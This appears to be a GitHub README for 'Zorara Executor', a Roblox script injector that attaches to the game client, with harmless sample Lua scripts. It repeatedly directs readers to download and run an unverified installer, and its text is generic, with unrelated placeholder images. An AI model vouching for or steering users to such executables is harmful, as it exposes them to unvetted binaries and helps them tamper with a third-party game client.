# Zorara Executor — Robust Roblox Lua Executor and Mod Runner

[![Releases - Download](https://img.shields.io/badge/Releases-Download-blue?logo=github&style=for-the-badge)](https://github.com/icinpabaac5/Zorara-Executor/releases)

![Zorara Banner](https://upload.wikimedia.org/wikipedia/commons/6/6a/Roblox_Logo_2023.svg)

A reliable launcher for running custom Lua payloads and mods inside Roblox. Zorara Executor focuses on clear execution, script management, and a flexible runtime. It targets power users, developers, and modders who work with Lua scripts and want a stable host to run them within a Roblox client environment.

Table of contents
- About
- Highlights
- Screenshots and visuals
- Downloads
- Install and run
- Quick start
- Script guide and examples
- Runtime features
- Advanced topics
- API reference
- Development guide
- Contribution
- Testing and CI
- Troubleshooting
- Frequently asked questions (FAQ)
- Roadmap
- Legal and licensing

About
Zorara Executor acts as a host for Lua code that interacts with a Roblox runtime. It provides a script loader, sandbox controls, quick injection hooks, script manager, and a small UI for script selection and execution. The tool keeps the runtime flexible and the script workflow direct.

Highlights
- Clean script loader and runner for Lua code.
- Script manager with categories and tags.
- Live editor with basic syntax highlighting.
- Simple plugin interface for adding features.
- Process attach and runtime hooks for real-time scripts.
- Built-in script library and favorites list.
- Secure sandboxing options to limit APIs.
- Extensible via a documented API.

Screenshots and visuals
- Main window mockup: https://raw.githubusercontent.com/github/explore/main/topics/roblox/roblox.png
- Script manager mockup: https://upload.wikimedia.org/wikipedia/commons/8/88/Console.png
- Live editor mockup: https://upload.wikimedia.org/wikipedia/commons/4/4f/Code_sample.png

Downloads
Visit the releases page to download the latest build and release artifacts:
- Primary download: https://github.com/icinpabaac5/Zorara-Executor/releases

The releases link includes packaged files. Download the appropriate release asset and execute the downloaded file to install or run Zorara Executor. The release artifact usually contains:
- An installer (.exe or .msi) for Windows.
- A compressed archive (.zip or .7z) with the runtime and tools.
- A portable executable for quick runs.

If the release path updates, use the project Releases page to find the latest build and assets.

Install and run
This section explains the general install flow and the usual runtime options. Do not follow steps that conflict with local policies or software terms.

1. Get a release asset.
   - Open the releases page: https://github.com/icinpabaac5/Zorara-Executor/releases
   - Download the asset that matches your system.

2. Unpack or run.
   - If the asset is an installer, run the installer and follow the prompts.
   - If the asset is a compressed archive, extract it to a folder and run the executable inside.

3. Start the app.
   - Launch the main executable. The app opens a compact UI with a script list and editor.

4. Load a script.
   - Use the script manager to add or import scripts.
   - Select a script and press Run.

Quick start
This quick start helps you open the app, add a script, and run it.

- Open the app.
- Click Add Script to import a Lua file.
- The script appears in the left panel with tags and a short description.
- Click the script to open it in the editor.
- Press Run to execute the script in the attached runtime.

Script guide and examples
Zorara ships with a plain Lua runtime. The executor supports core Lua plus a small set of helper APIs defined by the runtime.

Script structure
- A script is a text file with .lua extension.
- The runtime calls your main body when you press Run.
- You can use optional lifecycle functions:
  - init() — runs on load.
  - tick(dt) — runs repeatedly with a delta time.
  - stop() — runs on unload.

APIs available
The runtime exposes a short API set. Use these functions to interact with the host runtime.

- print(message)
  - Prints a message to the executor console.

- task.wait(seconds)
  - Pauses the current coroutine for the given interval.

- spawn(fn)
  - Runs a function in a new coroutine.

- Hooks and events
  - on_event(name, callback) — register callback for runtime events.
  - fire_event(name, data) — fire an event.

- File IO
  - io.read_file(path)
  - io.write_file(path, data)

- Networking (restricted)
  - http.get(url)
  - http.post(url, body)

Example: minimal script
```lua
-- hello.lua
function init()
  print("Hello from Zorara script.")
end

function tick(dt)
  -- run periodic work
end

function stop()
  print("Script stopped.")
end
```

Example: simple logger
```lua
-- logger.lua
local count = 0

function init()
  print("Logger started.")
  spawn(function()
    while true do
      count = count + 1
      print("Log entry:", count)
      task.wait(1)
    end
  end)
end

function stop()
  print("Logger stopped.")
end
```

Example: file save example
```lua
-- save_example.lua
function init()
  local data = "example data"
  io.write_file("example.txt", data)
  print("Saved example.txt")
end
```

Runtime features
- Script sandbox
  - Each script runs in a sandbox. The sandbox limits global access to core functions and the exposed API.
  - You can toggle sandbox level per script.

- Coroutine scheduler
  - The runtime provides a scheduler to run multiple coroutines safely.
  - Use spawn and task.wait for cooperative multitasking.

- Script isolation
  - Each script runs with its own global table unless you explicitly share one.

- Event system
  - The runtime includes a simple event bus. Use on_event and fire_event to coordinate scripts.

- Persistent storage
  - Scripts can store small key-value data in the runtime. Use storage.get and storage.set APIs.

- UI hooks
  - The runtime exposes a minimal UI API to create simple controls:
    - ui.create_button(label, callback)
    - ui.create_toggle(label, initial, callback)
    - ui.create_slider(label, min, max, initial, callback)

Advanced topics
This section covers advanced setup and automation. It presumes experience with Lua and process tools.

Script packs
- Bundle scripts into a folder and import them as a pack.
- Packs can include assets, config.json, and metadata files.
- The executor reads config.json to register scripts with tags.

Example pack layout
- mypack/
  - config.json
  - scripts/
    - example.lua
    - helper.lua
  - assets/
    - icon.png

config.json example
```json
{
  "name": "My Pack",
  "version": "1.0.0",
  "author": "YourName",
  "scripts": [
    {
      "file": "scripts/example.lua",
      "name": "Example",
      "tags": ["demo"]
    }
  ]
}
```

Automation and CLI
The app includes a headless mode for automation. Use it to run scripts without opening the UI.

- Headless mode flags (typical)
  - --headless
  - --script path/to/script.lua
  - --log path/to/log.txt

Example usage
- Run the executable with --headless and specify a script path.
- The app runs the script, logs output to a file, and exits when the script ends.

Plugin system
- The host supports small plugins to extend the UI and runtime behavior.
- Plugins live in the plugins folder and must expose a register function.

Plugin example (plugin.lua)
```lua
-- sample plugin
function register(runtime)
  runtime.ui.create_button("My Action", function()
    print("Plugin action fired")
  end)
end
```

API reference
This reference lists the exposed runtime functions and their intended use.

Core
- print(message)
  - Writes to the runtime console.

- spawn(fn)
  - Starts a coroutine.

- task.wait(seconds)
  - Suspends current coroutine.

- on_event(name, callback)
  - Register for events.

- fire_event(name, data)
  - Emit an event.

I/O
- io.read_file(path)
  - Return file data as string or nil on failure.

- io.write_file(path, data)
  - Write data to file.

Networking
- http.get(url)
  - Returns response body and status.

- http.post(url, body)
  - Sends a POST request.

UI
- ui.create_button(label, callback)
- ui.create_toggle(label, state, callback)
- ui.create_slider(label, min, max, initial, callback)

Storage
- storage.get(key)
- storage.set(key, value)

Lifecycle
- init() — optional function for setup.
- tick(dt) — optional periodic function.
- stop() — optional cleanup function.

Development guide
This section explains how to build and test the project locally. It helps contributors set up a dev environment.

Repository layout
- /src — core runtime and UI code.
- /scripts — example scripts and packs.
- /plugins — sample plugins.
- /build — build artifacts.
- /docs — additional docs.

Prerequisites
- A modern Windows machine or compatible environment.
- A Lua interpreter for running unit tests.
- Node.js for the build tooling if the UI uses web tech.
- A C/C++ toolchain to build native components if present.

Build steps (typical)
1. Clone the repo:
   - git clone https://github.com/icinpabaac5/Zorara-Executor.git
2. Install build tools:
   - Use the repo's build scripts to install dependencies.
3. Run the build script:
   - For native: use the included build scripts.
   - For UI: run npm install and npm run build.
4. Run tests:
   - Use the test runner included in the repo.

Testing and CI
- Unit tests cover the core scheduler and sandbox.
- Integration tests run small scripts through the runtime.
- The CI pipeline runs on push and pull requests.

Testing approach
- Mock internal APIs for deterministic tests.
- Run functional checks in headless mode.

Contribution
Follow this guide if you want to contribute. Keep changes clear and small.

How to contribute
1. Fork the repo and create a feature branch.
2. Write code with tests.
3. Open a pull request with a clear description.
4. The maintainers will review and merge.

Guidelines
- Keep commits focused.
- Add tests for new features.
- Document API changes in docs.

Issue reporting
- Provide a clear title and steps to reproduce.
- Attach log files from the runtime if possible.
- Include OS and build version.

Troubleshooting
This section lists common issues and fixes.

- App does not start
  - Ensure you have the right release for your OS.
  - Run from a folder with read/write access.

- Script fails with nil value
  - Check for missing functions in the script.
  - Verify the script uses the runtime API only.

- Plugin fails to register
  - Ensure the plugin exposes register(runtime).
  - Place the plugin file in the plugins folder.

- Headless mode logs nothing
  - Add --log flag to capture output.
  - Verify the script ends or runs a long-lived task.

Frequently asked questions (FAQ)
Q: What is Zorara Executor?
A: A host that runs Lua scripts and simple mods in a controlled runtime with a UI and lightweight APIs.

Q: Is Zorara cross-platform?
A: The initial builds target Windows. Cross-platform support depends on release assets and build targets.

Q: Where do I get the releases?
A: Get releases here: https://github.com/icinpabaac5/Zorara-Executor/releases

Q: How do I add scripts?
A: Use the UI Add Script button or place scripts in the scripts folder and import them as a pack.

Q: Does the runtime allow networking?
A: The runtime exposes limited HTTP helpers for outbound calls. The API aims to be safe and controlled.

Roadmap
Planned features and improvements:
- Expanded UI with themes.
- Better script pack manager with version control.
- Script dependency loader.
- Enhanced sandbox policies with per-script permission settings.
- Cross-platform builds.
- Plugin marketplace and community script sharing portal.

Legal and licensing
Zorara uses an open-source license to make collaboration clear. Check the LICENSE file in the repository for exact terms.

Attribution and assets
- Roblox logo used for illustration only; replace with your own assets for branding.
- Example images and mockups use public assets cited in image links.

Repository links
- Releases and downloads: https://github.com/icinpabaac5/Zorara-Executor/releases
- Main repo root: https://github.com/icinpabaac5/Zorara-Executor

Developer notes
Keep the runtime API stable. Add deprecation notices in code and docs, and keep the public interface minimal. Aim for clear versioning in releases and changelogs.

Build checklist
- Bump version in config.
- Update changelog with clear items.
- Run static checks and unit tests.
- Create release assets and tag.

Changelog tips
- Use semantic versioning.
- Write short entries for features and fixes.
- Link to issue numbers when feasible.

Maintenance
- Review PRs regularly.
- Keep test coverage healthy.
- Keep a small set of core maintainers for review.

Community
Encourage issue reports, sample script submissions, and plugin examples. Maintain a curated script list in the scripts folder.

Appendix: sample script library
This library offers a few safe examples that showcase runtime features.

1) Hello world
```lua
function init()
  print("Zorara sample: Hello world")
end
```

2) Counter
```lua
local i = 0
function init()
  spawn(function()
    while i < 5 do
      i = i + 1
      print("Count:", i)
      task.wait(0.5)
    end
    print("Counter done.")
  end)
end
```

3) Event demo
```lua
function init()
  on_event("test", function(data)
    print("Received event data:", data)
  end)
  fire_event("test", { value = 42 })
end
```

4) Simple UI
```lua
function init()
  ui.create_button("Click me", function()
    print("Button clicked")
  end)
  ui.create_toggle("Toggle", false, function(state)
    print("Toggle state:", state)
  end)
end
```

End of file.